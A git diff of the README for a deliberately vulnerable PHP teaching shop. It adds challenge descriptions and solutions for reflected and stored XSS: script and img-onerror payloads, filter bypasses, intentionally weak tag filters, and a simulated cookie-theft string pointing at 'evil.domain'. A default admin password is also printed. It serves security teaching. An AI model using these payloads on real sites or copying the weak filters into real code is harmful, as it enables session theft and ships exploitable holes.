@@ -1,15 +1,30 @@
 # WebSec - Shop
 
-This is a short summary of the most important points of the documentation for the WebSec Shop. The docker environment and the test setup *(vagrant)* are described in their own README files. 
+This is a short summary of the most important points of the documentation for the WebSec Shop. The docker environment and the test setup (Vagrant) are described in their own README files. 
 
 ## Installation and Setup
 
-1. Setup the docker environment with the ```setup_docker.sh``` script *(detailed explanation in the docker README)* **XOR** follow the steps described in the docker README manually.
+1. Setup the docker environment with the ```setup_docker.sh``` script (detailed explanation in the docker README) or follow the steps described in the docker README manually.
 2. Login with the default admin user:
 - **user** ```administrator```
 - **password** ```dpbCpfcAqVHY3gYf```
 3. Change the default password after the first login!
 4. Choose the settings either in the admin area of the WebSec shop or edit them directly in the ```config/settings.json``` file. *(The difficulty of the challenges must be set before the first student logs in. Otherwise, every student has to reset their challenges in the menu manually in order to load the new challenge settings.)*
+5. **Optional**: You can also create a user of your choice and later upgrade it via the MySQL command line client to an admin account:
+
+- Connect to the MySQL database
+
+```shell
+$ docker exec -it db_login /bin/bash
+
+$ mysql -u <dbUser> -p login
+```
+
+- The SQL query could look something like this:
+
+```sql
+UPDATE users SET is_admin = 1 WHERE user_name = <shopUser>;
+``` 
 
 ## Project Structure
 This is an overview over the files and directories directly related to the WebSec Shop. The structure is based on the [Standard PHP Package Skeleton](https://github.com/php-pds/skeleton).
@@ -48,14 +63,14 @@ www/
 #### bin/
 
 Contains the command line tools for this project.
-- ```convert_md_to_html.sh``` Converts markdown files *(like this one)* to valid HTML for the **docs/** folder.
+- ```convert_md_to_html.sh``` Converts markdown files (like this one) to valid HTML for the **docs/** folder.
 - ```get_docker_logs.sh``` Copys log files from the separat docker containers into the **bin/** folder.
 
 
 #### config/
 
 Contains the configurations and settings for the shop.
-- ```config.php``` Stores important constants for the project *(server name, paths etc.)*. Is effected by the ```setup_docker.sh``` script.
+- ```config.php``` Stores important constants for the project (server name, paths etc.). Is effected by the ```setup_docker.sh``` script.
 - ```db_login.php``` Contains the login credentials for the **login** database. Is also setup by the ```setup_docker.sh``` script.
 - ```db_shop.php``` Contains the login credentials for the **shop** database. Is also setup by the ```setup_docker.sh``` script.
 - ```settings.json``` Stores all settings for the shop. For a more detailed description see paragraph **Settings**.
@@ -65,9 +80,9 @@ Contains the configurations and settings for the shop.
 
 Contains all user SQLite databases for the SQLi challenge.
 
-On **normal** difficulty the databases are initialized with one table *('users')* that stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding student. The password that is displayed for the student is a random string.
+On **normal** difficulty the databases are initialized with one table (users) that stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding student. The password that is displayed for the student is a random string.
 
-On **hard** difficulty the above mentioned table is extended by a second one *('premium_users')* in which the premium user status is stored for every fake user and the student.
+On **hard** difficulty the above mentioned table is extended by a second one (premium_users) in which the premium user status is stored for every fake user and the student.
 
 The databases are created during the registration process with the ```create_sqli_db``` function in **src/websec_functions.php**.
 
@@ -82,7 +97,7 @@ This is the root directory for the apache webserver. All files within this direc
 
 The files for the registration and login system of the shop are directly located in the root directory.
 
-The ```.htaccess``` file redirects the most common server errors *(400, 401, 402, 403, 404, 500)* to custom error pages.
+The ```.htaccess``` file redirects the most common HTTP errors (400, 401, 402, 403, 404, 500) to custom error pages.
 
 The **admin/** directory contains the restricted admin area. Here you can see and download the student results for the challenges, change global shop settings and access the PHPMyAdmin sites for the MySQL databases *(if enabled in the ```docker-compose.yml```)*.
 
@@ -90,34 +105,183 @@ All pages related to the shop system and the hacking challenges are located in t
 
 The pages for the user settings and the local challenge settings are in the **user/** directory.
 
-All assets files like JavaScript, CSS or images are stored in the **assets/** directory. JavaScript or CSS files from third parties are stored separately in directories named 'vendor'.
+All assets files like JavaScript, CSS or images are stored in the **assets/** directory. Third party JavaScript or CSS files are stored separately in directories named 'vendor'.
 
 #### src/
 
-The **src/** directory contains all php functions relevant to the shop and the challenges. The functions are stored in different files depending on their domain *(```*_functions.php```)*.
+The **src/** directory contains all php functions relevant to the shop and the challenges. Depending on their domain, the functions are stored in different files each denoted with an appropriate prefix (```*_functions.php```).
 
 The **includes/** directory includes various files; mainly repetitive content that is later loaded in by other php scripts. The files are separated in different groups by their prefixes.
 
 #### tests/
 
-The [PHPUnit](https://phpunit.de/)  tests are stored in this directory. This directory can be omitted in production.
+Contains the [PHPUnit](https://phpunit.de/) tests. This directory can be omitted in production.
 
 
 #### vendor/
 
-Here are all the dependencies for the project stored. Currently, only the PHPUnit module has any dependencies.
+All dependencies for the project are stored in this directory. Currently, only the PHPUnit module has any dependencies. This directory can also be omitted in production.
 
 ## Challenges
 
-TODO: describe challenges briefly and how to solve them
+This is a short summary of the hacking challenges in the WebSec Shop and their solutions.
 
 #### Cross Site Scripting (Reflective)
 
+The reflective XSS challenge is located in the ```overview.php``` file.
+
+**Challenge**: The challenge is to abuse the product search field to read out the users own session ID that is stored in a cookie (XSS_YOUR_SESSION). The challenge is completed, if the user enters the cookie in the corresponding popup.
+
+The cookie is automatically generated during the user registration and later set after the user logs in. The cookie is destroyed after the session ends and the user logs out.
+The popup containing the field to enter the solution is automatically shown to the user after a JavaScript dialog (`alert()`, `confirm()` or `prompt()`) has been used on the product search page. To achieve this, a script overrides every dialog with a custom function. The custom function displays the original dialog (the users XSS attack) followed by the popup to enter the cookie.
+
+```js
+// temporarily override alert()
+// there are also variants for confirm() and prompt()
+(function () {
+
+    var _alertXSS = window.alert;
+
+    window.alert = function () {
+
+        // show the original alert content
+        _alertXSS.apply(window, arguments);
+
+        // show the popup to enter the solution
+        $('#xss-solution').modal('show');
+    };
+})();
+```
+
+**Solution**: Since the search term is printed out to the page, a solution would be to use a JavaScript dialog to output the cookie property of the document. JavaScript code can be executed by adding `<script>` tags to the search term. A working example would look like this:
+
+```html
+// could also be confirm(document.cookie) or prompt(document.cookie)
+<script>alert(document.cookie);</script>
+```
+
+Another approach would be to write the cookie directly to the page.
+
+```html
+<script>document.write(document.cookie)</script>
+```
+
+*If the attack is not performed via a JavaScript dialog function, the user has the option to trigger the popup mentioned above manually. A button and a short self-explanatory text is shown, when the search field is used and the search term contains `document.cookie`.*
+
+**Difficulty**: On hard difficulty the search term is also filtered for `<script>` tags: 
+
+```php
+if ($difficulty == "hard") {
+    // filter all '<script>' tags (case insensitive)
+    $rawSearchTerm = str_ireplace("<script>", "", $rawSearchTerm);
+
+    /*
+    * Alternative: filter only '<script>' and '<SCRIPT>' tags
+    * str_replace("<script>","", $rawSearchTerm)
+    * str_replace("<SCRIPT>","", $rawSearchTerm)
+    * Solution for all browsers: <ScRiPt>alert(document.cookie)</ScRiPt>
+    */
+}
+```
+
+The user has to circumvent this measure by using a different HTML tag that allows the execution of JavaScript. An example that works with all modern browsers would be the `<img>` tag:
+
+```html
+<img src="" onerror=javascript:alert(document.cookie)>
+```
+
 #### Cross Site Scripting (Stored)
+
+The stored XSS challenge is located in the ```product.php``` file.
+
+**Challenge**: In this challenge the user has to exploit a comment field on the product page. *(The product page and the comment section are identical for all products. Only the product information changes based on the `GET` variable in the URL.)* The comments are stored in an MySQL database. The task is to simulate a cookie stealing attack by showing a JavaScript dialog with the content ```'evil.domain/cookie.php?c=' + document.cookie```. The challenge is completed, when the user *steals* a session of a fake user and adds a certain product to the shopping cart.
+
+If the user enters the payload, the JavaScript dialog functions are overwritten and the content is send via AJAX Request to `xss_form_handler.php`.
+
+```js
+// override alert()
+// there are also variants for confirm() and prompt()
+window.alert = function (message) {
+
+    var request;
+
+    request = $.post("xss_form_handler.php", {
+        storedXSSMessage: message
+    });
+    request.done(function (response) {
+        showSuccess(message, response);
+    });
+    request.fail(function (response) {
+        showError(message, response);
+    });
+};
+```
+
+The message is validated by checking if it contains at least the elements 'evil', 'domain', 'cookie' and 'document.cookie' in any given order. After that, the user is shown a success or error message.
+
+The success message is a JavaScript `confirm()` dialog that gives the user the option to *steal* the session of a fake user. In order to simulate this, a second cookie is set that triggers a 'Welcome Back, *fake user*' popup and a function call to fill the shopping cart with a variety of products.
+The `check_stored_xss_challenge()` function is always called when the shop header is loaded on a page and verifies if the a certain product is added to the cart in order to successfully complete this challenge.
+
+**Solution**: To solve this challenge, the user has to display the payload on the product page. This could be done like this:
+
+```html
+<script>alert('evil.domain/cookie.php?c=' + document.cookie);</script>
+```
+
+**Difficulty**: On hard difficulty the `<script>` tags and the `alert()` function are filtered before a user comment is stored to the database. 
+
+```php
+if ($difficulty == "hard") {
+
+    // filter all '<script>' tags (case insensitive)
+    $filteredComment = str_ireplace("<script>", "", $_POST['userComment']);
+
+    /*
+    * Alternative: filter only '<script>' and '<SCRIPT>' tags
+    * str_replace("<script>","", $rawSearchTerm)
+    * str_replace("<SCRIPT>","", $rawSearchTerm)
+    * Solution for all browsers: <ScRiPt>alert(document.cookie<ScRiPt>
+    */
+
+    // additionally filter 'alert' command
+    $filteredComment = str_replace("alert", "", $filteredComment);
+
+    // add filtered comment to database
+    add_comment_to_db($filteredComment, $_SESSION['userName']);
+}
+```
+
+To circumvent this restrictions, the user can rely an a different HTML tag like `<img>` and use another JavaScript dialog function like `confirm()`.
+
+```html
+<img src="" onerror=javascript:confirm('evil.domain/cookie.php?c=' + document)>
+```
+
+The user could also use the `document.write` function.
 
 #### SQL Injection
 
+The SQLi challenge is located in the `friends.php` file.
+
+**Challenge**: In this challenge the user should exploit a search field and a SQLite database. The task is to upgrade the user account to a premium membership.
+
+The search field queries the 'users' table of the SQLite database which stores username, password, email, whish list and user status for every entry. The database is filled with a set of fake users and an entry for the corresponding user.
+
+// SQL query
+
+**Solution**:
+
+**Difficulty**:
+
 #### Cross Site Request Forgery
+
+The CSRF challenge is located in the `contact.php` file.
+
+**Challenge**:
+
+**Solution**:
+
+**Difficulty**:
 
 ## Settings
 
@@ -126,7 +290,7 @@ TODO: describe every setting and its effect
 
 ## Error Codes
 
-All exceptions and errors have a corresponding error code. In the following section, all those codes are listed and explained. Hints and/or known solutions can also be added in this part. 
+All exceptions and errors have a corresponding error code. In the following section, all these codes are listed and explained. Hints and/or known solutions can also be added in this part. 
 
 **010**: A PDO exception occurred during the connection attempt to the **login** database.
 - Database credentials are wrong *(either in ```config/config.php``` or in the ```.env``` file for the docker containers)*
@@ -234,3 +398,7 @@ The following naming conventions should be used throughout the project.
 **PHP Files**: ```file_name.php```
 
 **Other (Asset) Files**: ```file_name.ending```
+
+## Adding New Challenges
+
+TODO: Add notes for adding new challenges
